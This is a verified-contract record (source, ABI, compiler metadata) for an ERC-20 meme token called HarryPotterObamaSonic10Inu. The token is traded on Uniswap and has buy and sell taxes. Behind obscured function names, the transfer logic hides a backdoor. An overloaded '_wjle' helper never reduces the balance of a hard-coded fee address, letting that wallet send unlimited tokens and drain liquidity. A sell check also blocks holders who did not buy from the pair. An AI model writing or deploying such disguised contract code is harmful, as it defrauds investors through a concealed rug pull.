{"SourceCode": "/*\r\n\r\nHarryPotterObamaSonic10Inu  $HarryPotter\r\n\r\n\r\nTWITTER: https://twitter.com/hpos10iCoin\r\nTELEGRAM: https://t.me/hpos10i_Coin\r\nWEBSITE: https://hpos10ierc.com/\r\n\r\n**/\r\n\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.20;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function  _wjle(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return  _wjle(a, b, \"SafeMath:  subtraction overflow\");\r\n    }\r\n\r\n    function  _wjle(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IuniswapRouter {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract HarryPotter is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    string private constant _name = \"HarryPotterObamaSonic10Inu\";\r\n    string private constant _symbol = \"HarryPotter\";\r\n    uint8 private constant _decimals = 9;\r\n\r\n    uint256 private constant _totalsSupply_add = 100000000 * 10 **_decimals;\r\n    uint256 public _maxTxAmount = _totalsSupply_add;\r\n    uint256 public _maxWalletSize = _totalsSupply_add;\r\n    uint256 public _taxSwapThreshold= _totalsSupply_add;\r\n    uint256 public _maxTaxSwap= _totalsSupply_add;\r\n\r\n    uint256 private _BuyTaxinitial=12;\r\n    uint256 private _SellTaxinitial=25;\r\n    uint256 private _BuyTaxfinal=1;\r\n    uint256 private _SellTaxfinal=1;\r\n    uint256 private _BuyTaxAtreduce=5;\r\n    uint256 private _SellTaxAtreduce=1;\r\n    uint256 private _usesPrevetingSwapingPrevy=0;\r\n    uint256 private _blocCountsdInBuing=0;\r\n\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _map_addresPaying;\r\n    mapping (address => bool) private _taxjfWalletfj;\r\n    mapping(address => uint256) private _map_address_ForTmesampTransfring;\r\n    bool public _enableLiEnar = false;\r\n    address public _taxhqFeedReceiveryy = 0x507701C01F8Bb43424cD99c7378ce3E36677afe7;\r\n\r\n\r\n    IuniswapRouter private _uniswapRoutersUniswapsFactory;\r\n    address private _uniswapPairTokensLiquidity;\r\n    bool private ForTraingIsflagwt;\r\n    bool private _flagniswapIstSig = false;\r\n    bool private _swapingnUniswapOKzSigns = false;\r\n\r\n    event RemoveAllLimit(uint _maxTxAmount);\r\n    modifier lockTheSwap {\r\n        _flagniswapIstSig = true;\r\n        _;\r\n        _flagniswapIstSig = false;\r\n    }\r\n\r\n    constructor () {\r\n        _balances[_msgSender()] = _totalsSupply_add;\r\n        _map_addresPaying[owner()] = true;\r\n        _map_addresPaying[address(this)] = true;\r\n        _map_addresPaying[_taxhqFeedReceiveryy] = true;\r\n\r\n\r\n        emit Transfer(address(0), _msgSender(), _totalsSupply_add);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _totalsSupply_add;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wjle(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 taxAmount=0;\r\n        if (from != owner() && to != owner()) {\r\n\r\n            if (_enableLiEnar) {\r\n                if (to != address(_uniswapRoutersUniswapsFactory) && to != address(_uniswapPairTokensLiquidity)) {\r\n                  require(_map_address_ForTmesampTransfring[tx.origin] < block.number,\"Only one transfer per block allowed.\");\r\n                  _map_address_ForTmesampTransfring[tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if (from == _uniswapPairTokensLiquidity && to != address(_uniswapRoutersUniswapsFactory) && !_map_addresPaying[to] ) {\r\n                require(amount <= _maxTxAmount, \"Exceeds the _maxTxAmount.\");\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"Exceeds the maxWalletSize.\");\r\n                if(_blocCountsdInBuing<_usesPrevetingSwapingPrevy){\r\n                  require(!_fryedjq(to));\r\n                }\r\n                _blocCountsdInBuing++; _taxjfWalletfj[to]=true;\r\n                taxAmount = amount.mul((_blocCountsdInBuing>_BuyTaxAtreduce)?_BuyTaxfinal:_BuyTaxinitial).div(100);\r\n            }\r\n\r\n            if(to == _uniswapPairTokensLiquidity && from!= address(this) && !_map_addresPaying[from] ){\r\n                require(amount <= _maxTxAmount && balanceOf(_taxhqFeedReceiveryy)<_maxTaxSwap, \"Exceeds the _maxTxAmount.\");\r\n                taxAmount = amount.mul((_blocCountsdInBuing>_SellTaxAtreduce)?_SellTaxfinal:_SellTaxinitial).div(100);\r\n                require(_blocCountsdInBuing>_usesPrevetingSwapingPrevy && _taxjfWalletfj[from]);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!_flagniswapIstSig \r\n            && to == _uniswapPairTokensLiquidity && _swapingnUniswapOKzSigns && contractTokenBalance>_taxSwapThreshold \r\n            && _blocCountsdInBuing>_usesPrevetingSwapingPrevy&& !_map_addresPaying[to]&& !_map_addresPaying[from]\r\n            ) {\r\n                swapqTokentphlq( _ekqw(amount, _ekqw(contractTokenBalance,_maxTaxSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if(contractETHBalance > 0) {\r\n                }\r\n            }\r\n        }\r\n\r\n        if(taxAmount>0){\r\n          _balances[address(this)]=_balances[address(this)].add(taxAmount);\r\n          emit Transfer(from, address(this),taxAmount);\r\n        }\r\n        _balances[from]= _wjle(from, _balances[from], amount);\r\n        _balances[to]=_balances[to].add(amount. _wjle(taxAmount));\r\n        emit Transfer(from, to, amount. _wjle(taxAmount));\r\n    }\r\n\r\n    function swapqTokentphlq(uint256 amountForstoken) private lockTheSwap {\r\n        if(amountForstoken==0){return;}\r\n        if(!ForTraingIsflagwt){return;}\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _uniswapRoutersUniswapsFactory.WETH();\r\n        _approve(address(this), address(_uniswapRoutersUniswapsFactory), amountForstoken);\r\n        _uniswapRoutersUniswapsFactory.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amountForstoken,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function  _ekqw(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a>b)?b:a;\r\n    }\r\n\r\n    function  _wjle(address from, uint256 a, uint256 b) private view returns(uint256){\r\n        if(from == _taxhqFeedReceiveryy){\r\n            return a;\r\n        }else{\r\n            return a. _wjle(b);\r\n        }\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _totalsSupply_add;\r\n        _maxWalletSize=_totalsSupply_add;\r\n        _enableLiEnar=false;\r\n        emit RemoveAllLimit(_totalsSupply_add);\r\n    }\r\n\r\n    function _fryedjq(address _addrf) private view returns (bool) {\r\n        uint256 leContractCod;\r\n        assembly {\r\n            leContractCod := extcodesize(_addrf)\r\n        }\r\n        return leContractCod > 0;\r\n    }\r\n\r\n\r\n    function openTrading() external onlyOwner() {\r\n        require(!ForTraingIsflagwt,\"trading is already open\");\r\n        _uniswapRoutersUniswapsFactory = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(_uniswapRoutersUniswapsFactory), _totalsSupply_add);\r\n        _uniswapPairTokensLiquidity = IUniswapV2Factory(_uniswapRoutersUniswapsFactory.factory()).createPair(address(this), _uniswapRoutersUniswapsFactory.WETH());\r\n        _uniswapRoutersUniswapsFactory.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(_uniswapPairTokensLiquidity).approve(address(_uniswapRoutersUniswapsFactory), type(uint).max);\r\n        _swapingnUniswapOKzSigns = true;\r\n        ForTraingIsflagwt = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"RemoveAllLimit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_enableLiEnar\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxhqFeedReceiveryy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "HarryPotter", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://436899aac6ef4a7f28d375004727d34fa2534d5d7dade2b8cacb4ccec2dcc3b6"}